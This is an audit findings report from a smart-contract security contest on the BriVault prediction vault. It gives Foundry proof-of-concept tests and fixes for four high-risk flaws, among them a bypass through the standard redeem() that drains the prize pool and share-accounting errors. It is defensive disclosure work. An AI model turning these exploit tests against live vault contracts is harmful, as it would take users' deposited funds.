# BriVault - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Multiple joinEvent calls by same user inflate totalWinnerShares, reducing payouts](#H-01)
    - [H-02. Incomplete ERC4626 Override Allows Users to Bypass All Game Logic and Drain the Prize Pool](#H-02)
    - [H-03. Multiple deposits for the same user will overwrite `stakedAsset`](#H-03)
    - [H-04. Stale `userSharesToCountry` snapshot causes unfair payouts and potential insolvency](#H-04)
    - [H-05. Mismatched receiver vs sender in deposit enables refund without burning shares](#H-05)
    - [H-06. Share Calculation Can Be Manipulated via Direct Transfers, Leading to Unfair Share Pricing and Potential Loss of Value for Users](#H-06)
- ## Medium Risk Findings
    - [M-01. cancelParticipation() Leaves Ghost State, Inflating totalWinnerShares](#M-01)
    - [M-02. `joinEvent` function cannot prevent DOS caused by excessive participating users](#M-02)
- ## Low Risk Findings
    - [L-01. Support for Non-Standard ERC20 Assets (Fee-on-Transfer or Rebasing)](#L-01)
    - [L-02. Division-by-Zero in withdraw() Leads to Permanent Freezing of All Vault Assets](#L-02)
    - [L-03. Share Calculation Precision Loss in Winner Distribution](#L-03)
    - [L-04. `deposit` function may emit inaccurate events.](#L-04)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #52

### Dates: Nov 6th, 2025 - Nov 13th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-11-brivault)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 6
   - Medium: 2
   - Low: 4


# High Risk Findings

## <a id='H-01'></a>H-01. Multiple joinEvent calls by same user inflate totalWinnerShares, reducing payouts

_Submitted by [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [calvinkimani](https://profiles.cyfrin.io/u/calvinkimani), [0x_bob_0x](https://profiles.cyfrin.io/u/0x_bob_0x), [stevenalenga](https://profiles.cyfrin.io/u/stevenalenga), [yxsec](https://profiles.cyfrin.io/u/yxsec), [hark017](https://profiles.cyfrin.io/u/hark017), [iamgeorgi](https://profiles.cyfrin.io/u/iamgeorgi), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [minionteechs](https://profiles.cyfrin.io/u/minionteechs), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [eliab256](https://profiles.cyfrin.io/u/eliab256), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [codexsourcelogos](https://profiles.cyfrin.io/u/codexsourcelogos), [mafa](https://profiles.cyfrin.io/u/mafa), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [minos](https://profiles.cyfrin.io/u/minos), [shivanageshwarrao93](https://profiles.cyfrin.io/u/shivanageshwarrao93), [sulfurpt](https://profiles.cyfrin.io/u/sulfurpt), [snufflesrea](https://profiles.cyfrin.io/u/snufflesrea), [agilegypsy](https://profiles.cyfrin.io/u/agilegypsy), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [hunterspartan5](https://profiles.cyfrin.io/u/hunterspartan5), [shalinshah130](https://profiles.cyfrin.io/u/shalinshah130), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [wyd_derick](https://profiles.cyfrin.io/u/wyd_derick), [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [yogiemoji](https://profiles.cyfrin.io/u/yogiemoji), [iainlim](https://profiles.cyfrin.io/u/iainlim), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [hcrlen](https://profiles.cyfrin.io/u/hcrlen), [0xki](https://profiles.cyfrin.io/u/0xki), [balakchiev](https://profiles.cyfrin.io/u/balakchiev), [chain__warden](https://profiles.cyfrin.io/u/chain__warden), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [alvap](https://profiles.cyfrin.io/u/alvap), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [adrianheldesai](https://profiles.cyfrin.io/u/adrianheldesai), [al88nsk](https://profiles.cyfrin.io/u/al88nsk), [icis](https://profiles.cyfrin.io/u/icis), [wittyapple797](https://profiles.cyfrin.io/u/wittyapple797), [nugen](https://profiles.cyfrin.io/u/nugen), [ke5haav](https://profiles.cyfrin.io/u/ke5haav), [rodribogado50](https://profiles.cyfrin.io/u/rodribogado50), [darkfox](https://profiles.cyfrin.io/u/darkfox), [crazycelery](https://profiles.cyfrin.io/u/crazycelery), [bkawira](https://profiles.cyfrin.io/u/bkawira), [objectplayer](https://profiles.cyfrin.io/u/objectplayer), [tiannah](https://profiles.cyfrin.io/u/tiannah), [diana](https://profiles.cyfrin.io/u/diana), [eze001](https://profiles.cyfrin.io/u/eze001), [fredo182](https://profiles.cyfrin.io/u/fredo182), [arudop](https://profiles.cyfrin.io/u/arudop), [hugoh](https://profiles.cyfrin.io/u/hugoh), [m1s00](https://profiles.cyfrin.io/u/m1s00), [nkh000](https://profiles.cyfrin.io/u/nkh000), [ximon](https://profiles.cyfrin.io/u/ximon), [chobby](https://profiles.cyfrin.io/u/chobby), [0xnaresh](https://profiles.cyfrin.io/u/0xnaresh), [zhongguangyang0907](https://profiles.cyfrin.io/u/zhongguangyang0907), [0xliltee](https://profiles.cyfrin.io/u/0xliltee), [incogknito](https://profiles.cyfrin.io/u/incogknito), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [aliismakh](https://profiles.cyfrin.io/u/aliismakh), [shashankwcw](https://profiles.cyfrin.io/u/shashankwcw), [alexscherbatyuk](https://profiles.cyfrin.io/u/alexscherbatyuk), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [farnad](https://profiles.cyfrin.io/u/farnad), [sidd](https://profiles.cyfrin.io/u/sidd), [mnusurov](https://profiles.cyfrin.io/u/mnusurov), [drmanhattan852](https://profiles.cyfrin.io/u/drmanhattan852), [ugwokesamuel1](https://profiles.cyfrin.io/u/ugwokesamuel1), [happylion652](https://profiles.cyfrin.io/u/happylion652), [xcryptoguardian](https://profiles.cyfrin.io/u/xcryptoguardian), [rusrio](https://profiles.cyfrin.io/u/rusrio), [jufel](https://profiles.cyfrin.io/u/jufel), [jfornells](https://profiles.cyfrin.io/u/jfornells). Selected submission by: [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0)._      
            


# Root + Impact

* Root: `joinEvent` allows repeated joins and pushes duplicate `msg.sender` entries into `usersAddress` without guard.

* Impact: `totalWinnerShares` is computed by summing `userSharesToCountry[user][winnerCountryId]` across `usersAddress`, counting duplicates multiple times, inflating denominator and underpaying winners.

## Description

* Normal behavior: Each user should join once, and winner share sum should equal the sum of unique winners’ shares.

* Issue: `joinEvent` does not enforce single participation or uniqueness of `usersAddress`. Duplicate entries cause `totalWinnerShares` to be multiplied.

```solidity
// BriVault.sol
function joinEvent(uint256 countryId) public {
    // @> no guard preventing multiple joins
    userToCountry[msg.sender] = teams[countryId];
    uint256 participantShares = balanceOf(msg.sender);
    userSharesToCountry[msg.sender][countryId] = participantShares;
    usersAddress.push(msg.sender); // @> duplicates accumulate
}

function _getWinnerShares () internal returns (uint256) {
    for (uint256 i = 0; i < usersAddress.length; ++i){
        address user = usersAddress[i]; 
        totalWinnerShares += userSharesToCountry[user][winnerCountryId]; // @> duplicates counted
    }
}
```

## Risk

* Likelihood:

  * Occurs whenever a user calls `joinEvent` multiple times (no checks preventing it).

* Impact:

  * Winners receive a fraction of `finalizedVaultAsset` divided by inflated `totalWinnerShares`, leading to lower payouts and unfair distribution.

## Proof of Concept

```solidity
// File: test/AuditPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

contract AuditPoCTest is Test {
    uint256 public participationFeeBsp;
    uint256 public eventStartDate;
    uint256 public eventEndDate;
    address public participationFeeAddress;
    uint256 public minimumAmount;

    BriVault public briVault;
    MockERC20 public mockToken;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    string[48] countries = [
        "United States", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
        "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
        "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
        "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
        "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
        "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
        "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
        "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
    ];

    function setUp() public {
        participationFeeBsp = 150; // 1.5%
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 31 days;
        participationFeeAddress = makeAddr("participationFeeAddress");
        minimumAmount = 0.0002 ether;

        mockToken = new MockERC20("Mock Token", "MTK");

        // Mint balances
        mockToken.mint(owner, 100 ether);
        mockToken.mint(user1, 100 ether);
        mockToken.mint(user2, 100 ether);
        mockToken.mint(user3, 100 ether);

        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            participationFeeBsp,
            eventStartDate,
            participationFeeAddress,
            minimumAmount,
            eventEndDate
        );
        vm.stopPrank();
    }


    /// PoC-4: Multiple joinEvent calls inflate totalWinnerShares via duplicate addresses
    function test_poc4_multiple_joins_double_count_winner_shares() public {
        // Set countries and pick a winner index
        vm.prank(owner);
        briVault.setCountry(countries);
        uint256 winnerIdx = 10; // Japan

        // User1 deposits and joins winner multiple times
        vm.startPrank(user1);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, user1);
        briVault.joinEvent(winnerIdx);
        briVault.joinEvent(winnerIdx);
        briVault.joinEvent(winnerIdx);
        uint256 userShares = briVault.balanceOf(user1);
        vm.stopPrank();

        // End event and set winner
        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(winnerIdx);

        // totalWinnerShares should be 3x userShares due to duplicate entries in usersAddress
        assertEq(briVault.totalWinnerShares(), userShares * 3, "winner shares doubled/tripled by multiple joins");

        // Withdraw gives only 1/3 of finalized vault assets to the sole winner
        uint256 beforeBal = mockToken.balanceOf(user1);
        vm.prank(user1);
        briVault.withdraw();
        uint256 afterBal = mockToken.balanceOf(user1);
        uint256 payout = afterBal - beforeBal;

        // Expect payout to be approx finalizedVaultAsset / 3
        assertEq(payout, briVault.finalizedVaultAsset() / 3, "payout reduced by inflated denominator");
    }
}
```

**Test result**

```bash
forge test --match-test test_poc4_multiple_joins_double_count_winner_shares -vv

Ran 1 test for test/AuditPoC.t.sol:AuditPoCTest
[PASS] test_poc4_multiple_joins_double_count_winner_shares() (gas: 1816936)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.36ms (1.00ms CPU time)
```

## Recommended Mitigation

```diff
- usersAddress.push(msg.sender);
 require(bytes(userToCountry[msg.sender]).length == 0, "Already joined");
 usersAddress.push(msg.sender);
 numberOfParticipants++;
```

Additionally, consider maintaining a `mapping(address => bool) joined` and ensure `userSharesToCountry` updates append rather than overwrite if needed.

## <a id='H-02'></a>H-02. Incomplete ERC4626 Override Allows Users to Bypass All Game Logic and Drain the Prize Pool

_Submitted by [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [yxsec](https://profiles.cyfrin.io/u/yxsec), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [raminidalf](https://profiles.cyfrin.io/u/raminidalf), [minos](https://profiles.cyfrin.io/u/minos), [shivanageshwarrao93](https://profiles.cyfrin.io/u/shivanageshwarrao93), [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [shalinshah130](https://profiles.cyfrin.io/u/shalinshah130), [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [avspedaliere](https://profiles.cyfrin.io/u/avspedaliere), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [eze001](https://profiles.cyfrin.io/u/eze001), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [mnusurov](https://profiles.cyfrin.io/u/mnusurov), [alexscherbatyuk](https://profiles.cyfrin.io/u/alexscherbatyuk), [jericho](https://profiles.cyfrin.io/u/jericho), [neomartis](https://profiles.cyfrin.io/u/neomartis), [0xziin](https://profiles.cyfrin.io/u/0xziin), [arudop](https://profiles.cyfrin.io/u/arudop), [fredo182](https://profiles.cyfrin.io/u/fredo182), [m1s00](https://profiles.cyfrin.io/u/m1s00), [0x_bob_0x](https://profiles.cyfrin.io/u/0x_bob_0x), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [jufel](https://profiles.cyfrin.io/u/jufel). Selected submission by: [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4)._      
            


# Root + Impact

## Description

* The BriVault contract is designed as a specialized prediction vault. The intended behavior is that funds are locked until the event concludes, at which point only the winners can claim a share of the total prize pool.

* The contract inherits from OpenZeppelin's standard ERC4626, but it only overrides the deposit function. It critically fails to override the standard asset withdrawal functions: withdraw(uint256 assets, ...) and redeem(uint256 shares, ...). These functions from the parent contract remain public and retain their original logic, which is to allow any shareholder to redeem their shares for underlying assets at any time. This provides a backdoor that completely bypasses the custom withdraw() logic that checks for winners, allowing any user to exit their position and retrieve their stake.

```Solidity
contract BriVault is ERC4626, Ownable {
    // ... custom logic and variables ...

    // The contract correctly overrides deposit():
    function deposit(
        uint256 assets,
        address receiver
    ) public override returns (uint256) {
        // ... custom deposit logic ...
    }

    // It has a custom withdraw() function for winners:
    function withdraw() external winnerSet {
        // ... winner-checking logic ...
    }
```

## Risk

**Likelihood**:

*  This vulnerability is triggered by calling standard, well-documented functions of the ERC4626 interface. 

* No special conditions are required; any user who has deposited and received shares can immediately exploit this.

**Impact**:

* Total Bypass of Game Logic:The contract's core premise is broken. There is no lock-up period, and the risk of losing one's stake is eliminated. 

* Prize Pool Draining:\*\* A user who realizes they have lost the bet can call \`redeem()\` before the winner claims their prize. This removes their stake from the prize pool, directly reducing the amount available for the legitimate winner.

## Proof of Concept

1. It allows a loser to unfairly retrieve their stake.
2. This act of draining funds can cause a Denial of Service for the legitimate winner, making their withdraw() transaction revert and preventing them from claiming even the remaining portion of the prize pool.

```Solidity
function test_POC_LoserCanDrainPrizePoolViaStandardRedeem() public {
        vm.startPrank(owner);
        briVault.setCountry(countries);
        vm.stopPrank();

        uint256 depositAmount = 10 ether;

        vm.startPrank(user1); // The future Winner
        mockToken.approve(address(briVault), depositAmount);
        uint256 winnerShares = briVault.deposit(depositAmount, user1);
        briVault.joinEvent(4); // Bets on Brazil
        vm.stopPrank();

        vm.startPrank(user2); // The Loser
        mockToken.approve(address(briVault), depositAmount);
        uint256 loserShares = briVault.deposit(depositAmount, user2);
        briVault.joinEvent(10); // Bets on Japan
        vm.stopPrank();

        vm.warp(eventEndDate + 1 days);
        vm.startPrank(owner);
        briVault.setWinner(4); // Brazil wins
        vm.stopPrank();

        uint256 initialPrizePool = briVault.finalizedVaultAsset();
        console2.log("Prize pool before exploit:", initialPrizePool);
        assertGt(initialPrizePool, depositAmount);

        
        vm.startPrank(user2);
        uint256 balanceBeforeRedeem = mockToken.balanceOf(user2);
        ERC4626(address(briVault)).redeem(loserShares, user2, user2);
        uint256 balanceAfterRedeem = mockToken.balanceOf(user2);
        vm.stopPrank();

        assertGt(
            balanceAfterRedeem,
            balanceBeforeRedeem,
            "Loser should have gotten funds back"
        );

       
        uint256 prizePoolAfterExploit = mockToken.balanceOf(address(briVault));
        console2.log("Prize pool after exploit:", prizePoolAfterExploit);
        assertLt(
            prizePoolAfterExploit,
            initialPrizePool,
            "Prize pool was drained by the loser"
        );

        
        uint256 winnerBalanceBefore = mockToken.balanceOf(user1);
        vm.startPrank(user1);
        briVault.withdraw();
        uint256 winnerBalanceAfter = mockToken.balanceOf(user1);
        vm.stopPrank();

        
        uint256 expectedWinnings = prizePoolAfterExploit;
        assertEq(winnerBalanceAfter - winnerBalanceBefore, expectedWinnings);
    }
```

## Recommended Mitigation

To enforce the contract's intended logic, you must explicitly disable the standard ERC4626 withdrawal and redeem functions. The best practice is to override them and have them revert with a clear error message. It is also wise to rename your custom withdraw function to avoid confusion.

```diff
-   function withdraw() external winnerSet {
+   function claimWinnings() external winnerSet {
        if (block.timestamp < eventEndDate) {
            revert eventNotEnded();
        }
// ... rest of function ...
    }

+   /// @dev The standard `withdraw` function is disabled to enforce the vault's game logic. Use `claimWinnings`.
+   function withdraw(uint256, address, address) public pure override returns (uint256) {
+       revert("BriVault: Standard withdraw disabled. Use claimWinnings().");
+   }
+
+   /// @dev The standard `redeem` function is disabled to enforce the vault's game logic.
+   function redeem(uint256, address, address) public pure override returns (uint256) {
+       revert("BriVault: Standard redeem disabled.");
+   }
}
```

## <a id='H-03'></a>H-03. Multiple deposits for the same user will overwrite `stakedAsset`

_Submitted by [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [calvinkimani](https://profiles.cyfrin.io/u/calvinkimani), [stevenalenga](https://profiles.cyfrin.io/u/stevenalenga), [yxsec](https://profiles.cyfrin.io/u/yxsec), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [crazycelery](https://profiles.cyfrin.io/u/crazycelery), [mashiron](https://profiles.cyfrin.io/u/mashiron), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [mafa](https://profiles.cyfrin.io/u/mafa), [iamgeorgi](https://profiles.cyfrin.io/u/iamgeorgi), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [0xki](https://profiles.cyfrin.io/u/0xki), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [cryptostellar5](https://profiles.cyfrin.io/u/cryptostellar5), [al88nsk](https://profiles.cyfrin.io/u/al88nsk), [hcrlen](https://profiles.cyfrin.io/u/hcrlen), [0x_bob_0x](https://profiles.cyfrin.io/u/0x_bob_0x), [chobby](https://profiles.cyfrin.io/u/chobby), [diana](https://profiles.cyfrin.io/u/diana), [neomartis](https://profiles.cyfrin.io/u/neomartis), [jericho](https://profiles.cyfrin.io/u/jericho), [0xch1d3r4n](https://profiles.cyfrin.io/u/0xch1d3r4n), [darkfox](https://profiles.cyfrin.io/u/darkfox), [zhongguangyang0907](https://profiles.cyfrin.io/u/zhongguangyang0907), [mnusurov](https://profiles.cyfrin.io/u/mnusurov), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [jufel](https://profiles.cyfrin.io/u/jufel). Selected submission by: [darkfox](https://profiles.cyfrin.io/u/darkfox)._      
            


## Description

The protocol allows users to deposit assets multiple times. Each deposit increases the user’s vault shares and potential payout if their team wins.

However, when recording the user’s `stakedAsset` in the `deposit` function, the protocol overwrites the existing value instead of adding to it. This behavior causes an issue if the user decides to withdraw their assets before the event starts through `cancelParticipation`. In this case, the user will only be refunded the amount from their most recent `deposit` (minus the participation fee), effectively losing their earlier deposits.

This issue does not affect users who call `joinEvent` and participate in the event normally, since their shares are properly accounted for in the vault. The problem specifically affects users who make multiple deposits but later choose to cancel their participation before the event begins.

```solidity
function deposit(uint256 assets, address receiver) public override returns (uint256) {
    ...

    uint256 stakeAsset = assets - fee;

@>  stakedAsset[receiver] = stakeAsset;

    uint256 participantShares = _convertToShares(stakeAsset);

    IERC20(asset()).safeTransferFrom(msg.sender, participationFeeAddress, fee);

    IERC20(asset()).safeTransferFrom(msg.sender, address(this), stakeAsset);

    _mint(msg.sender, participantShares);


    emit deposited (receiver, stakeAsset);

    return participantShares;
}

function cancelParticipation () public  {
    if (block.timestamp >= eventStartDate){
        revert eventStarted();
    }

@>  uint256 refundAmount = stakedAsset[msg.sender];

    stakedAsset[msg.sender] = 0;

    uint256 shares = balanceOf(msg.sender);
    
    _burn(msg.sender, shares);

@>  IERC20(asset()).safeTransfer(msg.sender, refundAmount);
}
```

## Risk

**Likelihood**:

This occurs whenever a user makes multiple deposits before deciding to cancel their participation, which is a realistic and easily reproducible scenario.

**Impact**: 

The user will lose any assets from deposits before the most recent one, as the protocol only refunds the last recorded deposit amount. This would result in direct financial loss, where earlier deposits would be distributed between the winning team.

## Proof of Concept

Add this test to the test suite in `test/briVault.t.sol`.

```solidity
function testMultipleDepositsOverwritesStakedAssetsAndWillRefundWrongAmountUponCancelParticipation() public {
    vm.prank(owner);
    briVault.setCountry(countries);

    uint256 depositAmount = 5e18;
    uint256 base = 10000;
    uint256 feePerDeposit = (depositAmount * participationFeeBsp) / base;
    uint256 depositAmountMinusFee = depositAmount - feePerDeposit;
    uint256 user1AmountBeforeDeposits = mockToken.balanceOf(user1);

    vm.startPrank(user1);
    mockToken.approve(address(briVault), 2*depositAmount);
    briVault.deposit(depositAmount, user1);
    briVault.deposit(depositAmount, user1);
    uint256 amountAfterDeposits = mockToken.balanceOf(user1);
    briVault.cancelParticipation();
    vm.stopPrank();

    // user1 should be refunded both deposits minus fees but instead is refunded only one of the deposits minus both fees
    assert(mockToken.balanceOf(user1) == amountAfterDeposits + depositAmountMinusFee );
    assert(mockToken.balanceOf(user1) == user1AmountBeforeDeposits - depositAmount - feePerDeposit);
    assert(mockToken.balanceOf(user1) < user1AmountBeforeDeposits - 2 * feePerDeposit);
}
```

This test demonstrates that the user only receives a refund for their latest deposit rather than the total of all deposits.

## Recommended Mitigation

Accumulate deposits instead of overwriting the previous value in `stakedAsset`.

```diff
function deposit(uint256 assets, address receiver) public override returns (uint256) {
    ...

    uint256 stakeAsset = assets - fee;

-   stakedAsset[receiver] = stakeAsset;
+   stakedAsset[receiver] += stakeAsset;

    uint256 participantShares = _convertToShares(stakeAsset);

    IERC20(asset()).safeTransferFrom(msg.sender, participationFeeAddress, fee);

    IERC20(asset()).safeTransferFrom(msg.sender, address(this), stakeAsset);

    _mint(msg.sender, participantShares);


    emit deposited (receiver, stakeAsset);

    return participantShares;
}
```
## <a id='H-04'></a>H-04. Stale `userSharesToCountry` snapshot causes unfair payouts and potential insolvency

_Submitted by [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [yxsec](https://profiles.cyfrin.io/u/yxsec), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [codeaudit0x1](https://profiles.cyfrin.io/u/codeaudit0x1), [ke5haav](https://profiles.cyfrin.io/u/ke5haav), [darkfox](https://profiles.cyfrin.io/u/darkfox). Selected submission by: [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0)._      
            


# Root + Impact

* Root: `userSharesToCountry[msg.sender][countryId] = participantShares;` is set at join time and never updated. Later deposits increase `balanceOf(msg.sender)` but `totalWinnerShares` sums the stale snapshots.

* Impact: Winners can deposit more after joining to increase actual shares but denominator remains stale. First withdraw can overdraw relative to vault funds or create disproportionate payouts among winners.

## Description

* Normal behavior: Distribution should reflect current shares at the end of event.

* Issue: The denominator `totalWinnerShares` is based on stale values captured at join time and may be much lower than the sum of actual shares. This can lead to overpayment to early withdrawers or revert when attempting large transfers.

```solidity
// BriVault.sol
function joinEvent(uint256 countryId) public {
    uint256 participantShares = balanceOf(msg.sender);
    userSharesToCountry[msg.sender][countryId] = participantShares; // @> stale snapshot
}

function _getWinnerShares () internal returns (uint256) {
    for (uint256 i = 0; i < usersAddress.length; ++i){
        address user = usersAddress[i]; 
        totalWinnerShares += userSharesToCountry[user][winnerCountryId]; // @> sums stale snapshots
    }
}

function withdraw() external winnerSet {
    uint256 shares = balanceOf(msg.sender); // @> uses current shares
    uint256 assetToWithdraw = Math.mulDiv(shares, finalizedVaultAsset, totalWinnerShares);
}
```

## Risk

* Likelihood: High

  * Occurs whenever users deposit after joining.

* Impact: High

  * Unfair distribution (overpayment to those with larger current shares than snapshot).

  * Potential revert or draining of vault if first withdraw exceeds remaining assets.

## Proof of Concept

```solidity
// test/AuditPoC.t.sol::test_poc5_stale_snapshot_causes_unfair_and_potential_revert
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

contract AuditPoCTest is Test {
    uint256 public participationFeeBsp;
    uint256 public eventStartDate;
    uint256 public eventEndDate;
    address public participationFeeAddress;
    uint256 public minimumAmount;

    BriVault public briVault;
    MockERC20 public mockToken;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    string[48] countries = [
        "United States", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
        "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
        "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
        "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
        "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
        "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
        "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
        "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
    ];

    function setUp() public {
        participationFeeBsp = 150; // 1.5%
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 31 days;
        participationFeeAddress = makeAddr("participationFeeAddress");
        minimumAmount = 0.0002 ether;

        mockToken = new MockERC20("Mock Token", "MTK");

        // Mint balances
        mockToken.mint(owner, 100 ether);
        mockToken.mint(user1, 100 ether);
        mockToken.mint(user2, 100 ether);
        mockToken.mint(user3, 100 ether);

        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            participationFeeBsp,
            eventStartDate,
            participationFeeAddress,
            minimumAmount,
            eventEndDate
        );
        vm.stopPrank();
    }

    /// PoC-5: Stale winnerShares snapshot lets early joiners deposit more later and overdraw vault
    function test_poc5_stale_snapshot_causes_unfair_and_potential_revert() public {
        vm.prank(owner);
        briVault.setCountry(countries);
        uint256 winnerIdx = 10; // Japan

        // User1 joins with small initial deposit
        vm.startPrank(user1);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(1 ether, user1);
        briVault.joinEvent(winnerIdx); // snapshot at ~1 ether shares
        vm.stopPrank();

        // User2 joins with 1 ether
        vm.startPrank(user2);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(1 ether, user2);
        briVault.joinEvent(winnerIdx);
        vm.stopPrank();

        // Before event starts, user1 increases deposit significantly
        vm.startPrank(user1);
        briVault.deposit(9 ether, user1); // total ~10 ether shares now
        vm.stopPrank();

        // End event & set winner; totalWinnerShares uses stale snapshots (~1 + 1 ether shares)
        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(winnerIdx);

        uint256 staleTotal = briVault.totalWinnerShares();
        // user1 now has ~10x shares relative to their snapshot
        uint256 user1SharesNow = briVault.balanceOf(user1);
        uint256 user2SharesNow = briVault.balanceOf(user2);
        console.log("staleTotal", staleTotal);
        console.log("u1 now", user1SharesNow);
        console.log("u2 now", user2SharesNow);
        // Assert stale denominator is less than actual sum of current shares
        assertLt(staleTotal, user1SharesNow + user2SharesNow, "stale snapshot smaller than actual shares");

        // First withdraw by user1 should revert due to attempting to overdraw vault
        vm.startPrank(user1);
        vm.expectRevert();
        briVault.withdraw();
        vm.stopPrank();

        // Second withdraw by user2 succeeds but pays disproportionate amount based on stale denominator
        vm.startPrank(user2);
        uint256 before2 = mockToken.balanceOf(user2);
        briVault.withdraw();
        uint256 paid2 = mockToken.balanceOf(user2) - before2;
        vm.stopPrank();

        // Expected payout equals sharesNow * finalizedVaultAsset / staleTotal
        uint256 expectedPaid2 = (user2SharesNow * briVault.finalizedVaultAsset()) / staleTotal;
        assertEq(paid2, expectedPaid2, "payout uses stale denominator");
    }
}
```

**Test result**

```bash
forge test --match-test test_poc5_stale_snapshot_causes_unfair_and_potential_revert -vv


Ran 1 test for test/AuditPoC.t.sol:AuditPoCTest
[PASS] test_poc5_stale_snapshot_causes_unfair_and_potential_revert() (gas: 1967081)
Logs:
  staleTotal 1970000000000000000
  u1 now 9850000000000000000
  u2 now 985000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.20ms (4.53ms CPU time)
```

## Recommended Mitigation

```diff
- userSharesToCountry[msg.sender][countryId] = participantShares;
 // Either update snapshot on each deposit or compute winner shares live:
 // Option A: Recompute snapshots when setting winner
 // totalWinnerShares = sum(balanceOf(user) for all users that picked winnerCountryId)
 // Option B: Track cumulative shares per user updated on deposit/transfer/burn events.
```

Ensuring `totalWinnerShares` reflects actual end-state balances prevents unfair payouts and insolvency.

